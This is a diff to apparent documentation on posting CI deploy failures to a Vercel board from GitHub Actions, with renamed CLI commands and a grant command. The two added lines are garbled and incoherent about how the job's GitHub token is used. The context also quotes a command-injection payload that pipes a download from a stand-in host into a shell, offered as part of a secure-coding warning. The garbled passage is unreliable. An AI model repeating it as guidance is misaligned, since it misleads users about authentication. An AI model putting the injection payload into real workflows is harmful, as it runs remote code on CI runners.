@@ -2405,14 +2405,16 @@ To run triage on the board itself, with nothing kept open between messages, see
 permissions:
   id-token: write
 steps:
-  - run: npx -y @vercel/board post errors-www "deploy failed: $SHA" --label source=ci
+  - run: npx -y vercel board post errors-www "deploy failed: $SHA" --label source=ci --scope "$TEAM_ID"
     env:
-      VERCEL_ORG_ID: team_abc123
+      TEAM_ID: team_abc123
       SHA: ${{ github.sha }}
 ```
 
+With no Vercel login on the runner, `vercel board` hands board none, so the job's
+GitHub token goes (a Vercel CLI release that runs `vercel board` without a login).
 A grant lets the repository's runs in, with no secret:
-`vb grants create --github acme/www --git-branch main --can 'errors-www=post'`.
+`vercel board grants create --github acme/www --git-branch main --can 'errors-www=post'`.
 
 **Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
 like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
